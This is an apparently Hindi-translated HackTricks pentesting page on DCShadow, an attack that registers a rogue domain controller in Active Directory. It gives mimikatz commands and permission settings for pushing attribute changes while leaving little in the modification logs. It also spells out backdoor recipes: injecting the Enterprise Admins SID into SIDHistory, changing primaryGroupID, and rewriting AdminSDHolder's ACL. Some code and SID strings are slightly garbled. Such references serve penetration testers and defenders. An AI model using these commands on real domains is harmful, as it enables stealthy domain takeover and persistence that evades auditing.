<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने का उपयोग करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS परिवार**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# DCShadow

यह AD में एक **नया डोमेन कंट्रोलर** रजिस्टर करता है और इसे उपयोग करके निर्दिष्ट ऑब्जेक्ट पर **एट्रिब्यूट्स** (SIDHistory, SPNs...) को **पुश** करता है **बिना** किसी **संशोधन** के **लॉग** छोड़े। आपको DA विशेषाधिकार और **रूट डोमेन** के अंदर होना चाहिए।\
ध्यान दें कि अगर आप गलत डेटा का उपयोग करते हैं, तो बहुत बुरे लॉग दिखाई देंगे।

हमला करने के लिए आपको 2 mimikatz इंस्टेंस की आवश्यकता होती है। इनमें से एक RPC सर्वर्स को SYSTEM विशेषाधिकारों के साथ शुरू करेगा (आपको यहां बदलाव बताना होगा जो आप करना चाहते हैं), और दूसरा इंस्टेंस मान्यता प्रदान करने के लिए उपयोग किया जाएगा:

{% code title="mimikatz1 (RPC सर्वर्स)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - DA या समान की आवश्यकता होती है" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

ध्यान दें कि **`elevate::token`** mimikatz1 सत्र में काम नहीं करेगा क्योंकि यह धागे की विशेषाधिकारता को उच्च करता है, लेकिन हमें **प्रक्रिया की विशेषाधिकारता** को उच्च करने की आवश्यकता होती है।\
आप एक "LDAP" ऑब्जेक्ट भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप इन बदलावों को एक DA से या इस न्यूनतम अनुमतियों वाले उपयोगकर्ता से पुश कर सकते हैं:

* **डोमेन ऑब्जेक्ट** में:
* _DS-Install-Replica_ (डोमेन में रेप्लिका जोड़ें/हटाएं)
* _DS-Replication-Manage-Topology_ (रेप्लिकेशन टोपोलॉजी प्रबंधित करें)
* _DS-Replication-Synchronize_ (रेप्लिकेशन सिंक्रनाइज़ेशन)
* **कॉन्फ़िगरेशन कंटेनर** में **साइट्स ऑब्जेक्ट** (और इसके बच्चे):
* _CreateChild और DeleteChild_
* **DC के रूप में पंजीकृत किए गए कंप्यूटर** का ऑब्जेक्ट:
* _WriteProperty_ (लेखन नहीं)
* **लक्षित ऑब्जेक्ट**:
* _WriteProperty_ (लेखन नहीं)

आप [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग करके इन अनुमतियों को एक अनुप्रयोगित उपयोगकर्ता को दे सकते हैं (ध्यान दें कि इससे कुछ लॉग बचेंगे)। यह DA अनुमतियों की तुलना में बहुत अधिक संकुचित है।\
उदाहरण के लिए: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` इसका अर्थ है कि जब मशीन _**mcorp-student1**_ में लॉग ऑन होता है तो उपयोगकर्ता नाम _**student1**_ को _**root1user**_ ऑब्जेक्ट पर DCShadow अनुमतियाँ होती हैं।

## बैकडोर बनाने के लिए DCShadow का उपयोग करना

{% code title="एक उपयोगकर्ता के लिए SIDHistory में एंटरप्राइज एडमिन्स सेट करें" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="प्राथमिक समूह आईडी बदलें (उपयोगकर्ता को डोमेन प्रशासकों के सदस्य के रूप में डालें)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="AdminSDHolder के ntSecurityDescriptor को संशोधित करें (एक उपयोगकर्ता को पूर्ण नियंत्रण दें)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## शैडोसेप्शन - DCShadow का उपयोग करके DCShadow अनुमतियाँ दें (संशोधित अनुमतियाँ लॉग नहीं)

हमें निम्नलिखित ACE को हमारे उपयोगकर्ता के SID के साथ अंत में जोड़ना होगा:

* डोमेन ऑब्जेक्ट पर:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* हमलावर कंप्यूटर ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
* लक्षित उपयोगकर्ता ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
* कॉन्फ़िगरेशन कंटेनर में साइट्स ऑब्जेक्ट पर: `(A;CI;CCDC;;;UserSID)`

एक ऑब्जेक्ट के वर्तमान ACE को प्राप्त करने के लिए: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

ध्यान दें कि इस मामले में आपको कई बदलाव करने की आवश्यकता होगी, केवल एक ही नहीं। इसलिए, **mimikatz1 सत्र** (RPC सर्वर) में प्रामाणिकता **`/stack` पैरामीटर का उपयोग करें** जिसके साथ आप बदलाव करना चाहते हैं। इस तरीके से, आपको केवल एक बार **`/push`** करने की आवश्यकता होगी ताकि रोग सर्वर में सभी अटके हुए बदलाव को करने के लिए।



[**ired.team में DCShadow के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके अपना योगदान दें।**

</details>
